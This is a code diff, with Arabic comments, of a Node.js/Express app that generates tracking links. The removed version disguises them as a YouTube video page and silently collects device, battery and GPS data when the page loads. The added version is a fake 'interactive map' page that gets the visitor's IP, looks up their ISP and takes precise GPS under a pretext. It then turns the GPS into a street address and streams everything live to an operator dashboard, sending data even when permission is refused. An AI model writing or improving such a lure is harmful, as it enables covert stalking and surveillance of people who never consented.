@@ -8,7 +8,7 @@ const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.json());
 
-// 1. الصفحة الرئيسية: لوحة التحكم لإنشاء الروابط ومتابعة المعلومات
+// 1. لوحة التحكم الرئيسية لعرض النتائج وتوليد روابط الخرائط
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -16,182 +16,200 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>لوحة التحكم - روابط يوتيوب المموهة</title>
+        <title>لوحة التحكم - تعقب الخرائط</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-            button { background: #ff0000; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; transition: 0.2s; font-weight: bold; }
-            button:hover { background: #cc0000; }
+            button { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+            button:hover { background: #0056b3; }
             input { width: 90%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; text-align: center; margin-top: 10px; }
-            .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #ff0000; font-size: 14px; line-height: 1.7; }
+            .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #007bff; font-size: 14px; line-height: 1.7; }
         </style>
     </head>
     <body>
-        <h2>📺 منشئ روابط فيديوهات يوتيوب الذكية</h2>
+        <h2>🗺️ منشئ روابط الخرائط والمواقع الذكية</h2>
         <div class="card">
-            <p>ضع رابط فيديو يوتيوب أدناه لدمجه وإنشاء رابط تتبع:</p>
-            <input type="text" id="ytUrlInput" placeholder="مثال: https://www.youtube.com/watch?v=XXXXXXX" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
-            <br><br>
-            <button onclick="generateLink()">🔗 إنشاء الرابط المموه</button>
+            <p>انقر لإنشاء رابط خريطة تفاعلي:</p>
+            <button type="button" onclick="makeLink()">🔗 إنشاء رابط الخريطة</button>
             <div id="linkContainer" style="display:none; margin-top: 15px;">
-                <p>الرابط الخاص بك جاهز (أرسله لمن تريد):</p>
-                <input type="text" id="linkInput" readonly>
+                <p>الرابط الخاص بك (انسخه وافتحه):</p>
+                <input type="text" id="linkInput" readonly onclick="this.select();">
             </div>
         </div>
 
-        <h3>📥 سجل معلومات الأجهزة والمواقع الواردة:</h3>
+        <h3>📥 التقارير والمواقع الواردة:</h3>
         <div id="logs" class="card">
-            <p style="color: #aaa;">في انتظار فتح أي شخص للرابط...</p>
+            <p style="color: #aaa;">في انتظار فتح الرابط...</p>
         </div>
 
+        <script src="/socket.io/socket.io.js"></script>
         <script>
-            function generateLink() {
-                const ytUrl = document.getElementById('ytUrlInput').value;
-                const videoIdMatch = ytUrl.match(/(?:v=|youtu\.be\/)([\w-]{11})/);
-                const videoId = videoIdMatch ? videoIdMatch[1] : "dQw4w9WgXcQ"; // افتراضي إذا لم يتم إدخال رابط صحيح
-                
-                const uniqueId = Math.random().toString(36).substring(2, 9);
-                const fullUrl = window.location.origin + '/watch/' + uniqueId + '?v=' + videoId;
+            function makeLink() {
+                const uniqueId = Math.random().toString(36).substring(2, 8);
+                const fullUrl = window.location.origin + '/map/' + uniqueId;
                 
                 document.getElementById('linkInput').value = fullUrl;
                 document.getElementById('linkContainer').style.display = 'block';
             }
 
-            // استقبال البيانات فورياً عبر Socket.io
-            const script = document.createElement('script');
-            script.src = "/socket.io/socket.io.js";
-            script.onload = () => {
-                const socket = io();
-                socket.on('new-device-data', (data) => {
-                    const logs = document.getElementById('logs');
-                    if (logs.innerText.includes('في انتظار فتح')) logs.innerHTML = '';
-                    
-                    const box = document.createElement('div');
-                    box.className = 'info-box';
-                    box.innerHTML = \`
-                        <strong>🔑 المعرّف:</strong> \${data.linkId}<br>
-                        <strong>📱 اسم الهاتف / الجهاز الحقيقي:</strong> \${data.deviceName}<br>
-                        <strong>🌐 النظام والمتصفح:</strong> \${data.platform}<br>
-                        <strong>🔋 نسبة الشحن:</strong> \${data.battery}<br>
-                        <strong>📍 الموقع الجغرافي (الإحداثيات):</strong> \${data.location}<br>
-                        <strong>🕒 الوقت:</strong> \${data.time}<br>
-                        <strong>🖥️ أبعاد الشاشة:</strong> \${data.screenResolution}
-                    \`;
-                    logs.prepend(box);
-                });
-            };
-            document.head.appendChild(script);
+            const socket = io();
+            socket.on('new-device-data', (data) => {
+                const logs = document.getElementById('logs');
+                if (logs.innerText.includes('في انتظار فتح')) logs.innerHTML = '';
+                
+                const box = document.createElement('div');
+                box.className = 'info-box';
+                box.innerHTML = '<strong>📱 ماركة الهاتف:</strong> ' + data.deviceName + '<br>' +
+                                '<strong>🌐 المتصفح والنظام:</strong> ' + data.browser + ' / ' + data.os + '<br>' +
+                                '<strong>📡 الشبكة (ISP):</strong> ' + data.networkISP + '<br>' +
+                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
+                                '<strong>📍 العنوان الدقيق (الشارع والمنطقة):</strong> <span style="color: #4CAF50; font-weight: bold;">' + data.fullAddress + '</span><br>' +
+                                '<strong>🗺️ إحداثيات الخريطة:</strong> <a href="https://maps.google.com/?q=' + data.lat + ',' + data.lon + '" target="_blank" style="color: #00bcd4;">فتح على خرائط جوجل</a><br>' +
+                                '<strong>🕒 الوقت:</strong> ' + data.time;
+                logs.prepend(box);
+            });
         </script>
     </body>
     </html>
   `);
 });
 
-// 2. صفحة عرض فيديو اليوتيوب الحقيقي (تبدو كأنها يوتيوب تماماً) وفي الخلفية يتم جمع المعلومات
-app.get('/watch/:id', (req, res) => {
-  const videoId = req.query.v || 'dQw4w9WgXcQ';
+// 2. صفحة الخريطة الوهمية التي تطلب إذن الموقع عند الضغط على الزر
+app.get('/map/:id', async (req, res) => {
+  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
+  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
+
   res.send(`
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>YouTube</title>
+        <title>خريطة الموقع التفاعلية</title>
         <style>
-            body { font-family: Roboto, Arial, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 0; text-align: center; }
-            .header { background: #212121; padding: 12px 20px; text-align: left; font-weight: bold; font-size: 18px; color: #ff0000; border-bottom: 1px solid #333; }
-            .container { max-width: 800px; margin: 20px auto; padding: 10px; }
-            .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
-            .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
-            .title { text-align: right; margin-top: 15px; font-size: 18px; font-weight: bold; }
+            body { font-family: Arial, sans-serif; background: #f4f4f9; color: #333; margin: 0; padding: 0; text-align: center; }
+            .header { background: #007bff; color: white; padding: 15px; font-size: 20px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+            .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+            button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; box-shadow: 0 4px 10px rgba(40,167,69,0.3); }
+            button:hover { background: #218838; }
+            p { color: #666; font-size: 15px; line-height: 1.6; }
+            #status { margin-top: 15px; font-weight: bold; color: #007bff; }
         </style>
     </head>
     <body>
-        <div class="header">▶ YouTube</div>
+        <div class="header">📍 مشاركة الموقع الجغرافي</div>
         <div class="container">
-            <div class="video-container">
-                <iframe src="https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-            </div>
-            <div class="title">جارِ تشغيل الفيديو...</div>
+            <h3>عرض موقعك الحالي على الخريطة</h3>
+            <p>للعثور على الموقع بدقة وتحديث الإحداثيات على الخريطة المباشرة، يرجى الضغط على الزر أدناه والسماح بالوصول للموقع.</p>
+            <button onclick="requestLocation()">🗺️ عرض الموقع الآن</button>
+            <div id="status"></div>
         </div>
 
         <script>
-            // دالة استخراج اسم الهاتف الحقيقي من UserAgent
-            function getDeviceName(ua) {
-                if (ua.includes('iPhone')) return 'iPhone (ابل آيفون)';
-                if (ua.includes('iPad')) return 'iPad (آيباد)';
-                if (ua.includes('Samsung')) return 'Samsung Galaxy (سامسونج)';
-                if (ua.includes('Huawei')) return 'Huawei (هواوي)';
-                if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) return 'Xiaomi / Redmi (شاومي)';
-                if (ua.includes('OPPO')) return 'OPPO';
-                if (ua.includes('Realme')) return 'Realme';
-                if (ua.includes('Vivo')) return 'Vivo';
-                if (ua.includes('Android')) {
-                    let match = ua.match(/\\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|Nexus\\s[0-9]+|Pixel\\s[0-9a-zA-Z\\s]+|LM-[A-Z0-9]+)\\b/);
-                    return match ? "هاتف اندرويد موديل: " + match[1] : "هاتف Android عام";
-                }
-                if (ua.includes('Windows')) return 'كمبيوتر مكتبي (Windows)';
-                if (ua.includes('Macintosh')) return 'جهاز Mac (ماك)';
-                return 'جهاز غير معروف';
+            function getExactDeviceModel(ua) {
+                let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
+                if (match) return match[0];
+                if (ua.includes('Android')) return 'هاتف Android';
+                if (ua.includes('iPhone')) return 'Apple iPhone';
+                if (ua.includes('Windows')) return 'Windows Computer';
+                return 'جهاز ذكي';
             }
 
-            async function collectData() {
-                let batteryLevel = "غير مدعوم";
-                if (navigator.getBattery) {
-                    try {
-                        const b = await navigator.getBattery();
-                        batteryLevel = Math.round(b.level * 100) + "% " + (b.charging ? "(⚡ يشحن)" : "(على البطارية)");
-                    } catch(e){}
-                }
+            function getBrowserInfo(ua) {
+                if (ua.includes('Firefox')) return 'Firefox';
+                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
+                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+                if (ua.includes('Edg')) return 'Edge';
+                if (ua.includes('Chrome')) return 'Chrome';
+                if (ua.includes('Safari')) return 'Safari';
+                return 'متصفح آخر';
+            }
 
-                // محاولة الحصول على الموقع الجغرافي (GPS) بدقة
-                let locationStr = "لم يقم المستخدم بالسماح بالموقع أو مرفوض";
+            function getOSInfo(ua) {
+                if (ua.includes('Win')) return 'Windows';
+                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+                if (ua.includes('Android')) return 'Android';
+                if (ua.includes('Mac')) return 'macOS';
+                return 'أخرى';
+            }
+
+            async function requestLocation() {
+                document.getElementById('status').innerText = "جاري الاتصال بالأقمار الصناعية وتحميل الخريطة...";
+                
+                const ua = navigator.userAgent;
+                const deviceData = {
+                    deviceName: getExactDeviceModel(ua),
+                    browser: getBrowserInfo(ua),
+                    os: getOSInfo(ua),
+                    ip: "${clientIp}",
+                    networkISP: "جاري الجلب...",
+                    fullAddress: "جاري تحديد الموقع...",
+                    lat: 0,
+                    lon: 0,
+                    time: new Date().toLocaleTimeString('ar-EG')
+                };
+
+                // جلب معلومات الـ IP والشبكة
+                try {
+                    const response = await fetch('https://ipapi.co/${clientIp}/json/');
+                    const ipData = await response.json();
+                    deviceData.networkISP = ipData.org || "غير معروف";
+                } catch(e){}
+
+                // طلب إذن الـ GPS الفعلي عند ضغط الزر
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            locationStr = "خط الطول: " + position.coords.latitude + ", خط العرض: " + position.coords.longitude + " (دقة: " + position.coords.accuracy + " متر)";
-                            sendToServer(batteryLevel, locationStr);
+                        async (pos) => {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            deviceData.lat = lat;
+                            deviceData.lon = lon;
+
+                            try {
+                                const resGeo = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&accept-language=ar');
+                                const geoData = await resGeo.json();
+                                if (geoData && geoData.display_name) {
+                                    deviceData.fullAddress = geoData.display_name;
+                                } else {
+                                    deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
+                                }
+                            } catch(err) {
+                                deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
+                            }
+
+                            sendData(deviceData);
+                            document.getElementById('status').style.color = "green";
+                            document.getElementById('status').innerText = "✅ تم تحميل الموقع بنجاح!";
                         },
-                        (error) => {
-                            sendToServer(batteryLevel, locationStr); // إرسال البيانات حتى لو رفض إذن الموقع
+                        (err) => {
+                            deviceData.fullAddress = "رفض المستخدم إذن الموقع";
+                            sendData(deviceData);
+                            document.getElementById('status').style.color = "red";
+                            document.getElementById('status').innerText = "❌ يجب السماح بإذن الموقع لعرض الخريطة.";
                         },
                         { timeout: 10000, enableHighAccuracy: true }
                     );
                 } else {
-                    sendToServer(batteryLevel, locationStr);
+                    deviceData.fullAddress = "المتصفح لا يدعم تحديد الموقع";
+                    sendData(deviceData);
                 }
             }
 
-            function sendToServer(battery, location) {
-                const deviceData = {
-                    linkId: "${req.params.id}",
-                    deviceName: getDeviceName(navigator.userAgent),
-                    platform: navigator.platform || "موبايل/متصفح ذكي",
-                    battery: battery,
-                    location: location,
-                    time: new Date().toLocaleTimeString('ar-EG'),
-                    screenResolution: window.screen.width + "x" + window.screen.height
-                };
-
+            function sendData(data) {
                 fetch('/api/log', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(deviceData)
+                    body: JSON.stringify(data)
                 });
             }
-
-            // تنفيذ الجمع فور دخول الصفحة بينما يعمل فيديو اليوتيوب أمامه
-            window.onload = collectData;
         </script>
     </body>
     </html>
   `);
 });
 
-// 3. مسار استقبال البيانات وبثها للوحة التحكم
 app.post('/api/log', (req, res) => {
-  const data = req.body;
-  io.emit('new-device-data', data);
+  io.emit('new-device-data', req.body);
   res.json({ status: 'success' });
 });
 
